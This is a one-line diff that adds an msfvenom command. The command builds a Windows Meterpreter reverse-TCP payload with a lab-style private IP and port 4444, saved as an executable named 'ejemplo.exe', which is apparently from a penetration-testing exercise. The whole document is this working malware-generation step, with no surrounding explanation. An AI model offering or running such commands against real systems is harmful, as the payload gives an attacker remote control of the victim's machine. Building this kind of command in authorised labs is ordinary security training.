@@ -1,0 +1,1 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.172.128 LPORT=4444 --platform windows --arch x86 -f exe > ejemplo.exe
